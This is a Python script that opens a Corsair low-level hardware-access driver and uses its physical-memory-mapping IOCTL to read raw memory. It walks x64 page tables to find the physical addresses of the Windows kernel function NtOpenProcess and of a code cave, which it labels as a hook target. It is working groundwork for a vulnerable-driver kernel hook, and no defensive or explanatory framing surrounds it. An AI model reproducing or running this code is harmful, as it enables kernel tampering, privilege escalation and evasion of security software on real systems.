import ctypes
import struct

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read8(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    return struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(v + (pa & 0xFFF))))[0]

def kva_to_pa(h, kva, cr3):
    idxs = [(kva >> 39) & 0x1FF, (kva >> 30) & 0x1FF, (kva >> 21) & 0x1FF, (kva >> 12) & 0x1FF]
    
    # PML4
    e = read8(h, (cr3 & PTE_PHYS_MASK) + idxs[0] * 8)
    if e is None or not (e & 1): return None
    
    # PDPT
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[1] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)
    
    # PD
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[2] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)
    
    # PT
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[3] * 8)
    if e is None or not (e & 1): return None
    
    return (e & PTE_PHYS_MASK) + (kva & 0xFFF)

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    # Use System DirBase from fresh dump
    CR3 = 0x1AE000
    
    # Current VAs from fresh dump
    NT_OPEN_PROCESS = 0xFFFFF807C92505D0
    CAVE_VA = 0xFFFFF8075AA41900
    
    print(f"[*] Translating NtOpenProcess (0x{NT_OPEN_PROCESS:X})...")
    pa_hook = kva_to_pa(h, NT_OPEN_PROCESS, CR3)
    if pa_hook:
        print(f"[+] PA Hook: 0x{pa_hook:X}")
    else:
        print("[-] Hook translation failed")

    print(f"[*] Translating Cave (0x{CAVE_VA:X})...")
    pa_cave = kva_to_pa(h, CAVE_VA, CR3)
    if pa_cave:
        print(f"[+] PA Cave: 0x{pa_cave:X}")
    else:
        print("[-] Cave translation failed")

    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
